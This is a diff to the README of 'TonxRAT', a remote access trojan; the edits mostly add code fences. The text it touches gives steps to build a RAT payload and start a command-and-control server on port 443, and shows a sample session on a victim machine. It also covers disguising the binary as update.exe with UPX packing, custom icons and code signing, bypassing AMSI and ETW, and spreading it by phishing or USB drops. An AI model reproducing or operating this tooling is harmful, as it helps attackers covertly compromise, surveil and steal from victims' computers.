@@ -39,36 +39,37 @@ sysinfo - System information screenshot - Capture screen shell - Execute command
 git clone https://github.com/Anton-ai111/TonxRAT-v2.git
 cd TonxRAT
 pip install -r requirements.txt
+'''
 2. Build Payload
-bash
+'''bash
 
 
 
 python tonxRAT.py
 
 
-
+'''
 1. Windows 10/11
 2. Ubuntu Linux
 C2 IP: your.server.com
 C2 Port: 443
 RAT Name: update.exe
 3. Start C2 Server
-bash
+'''bash
 
 
 
 python tonx_c2_server.py
 
 
-
+'''
 TonxRAT C2 Server: 0.0.0.0:443
 > sysinfo
 Hostname: VICTIM-PC
 User: victim
 🛠️ Advanced Usage
 Custom Builds
-python
+'''python
 
 
 
@@ -76,8 +77,9 @@ python
 --icon=favicon.ico     # Custom icon
 --upx-dir=upx/        # UPX packing
 --key=your_key        # Custom encryption key
+'''
 Obfuscation Pipeline
-bash
+'''bash
 
 
 
@@ -92,6 +94,7 @@ rcedit update.exe --set-icon favicon.ico
 
 # 4. Cert signing (optional)
 signtool sign /f cert.pfx update.exe
+'''
 📊 Capabilities Matrix
 
 
@@ -130,7 +133,7 @@ TonxRAT Client <--> [Fernet AES-128] <--> C2 Server
 AMSI  ETW  PTY
 Bypass Bypass Shell
 📋 Requirements
-txt
+'''txt
 
 
 
@@ -139,6 +142,7 @@ cryptography>=41.0.0
 pillow>=10.0.0
 psutil>=5.9.0
 pywin32>=306          # Windows only
+'''
 🎯 Deployment Scenarios
 Phishing: update.exe disguised as software update
 USB Drop: Autorun + LNK files
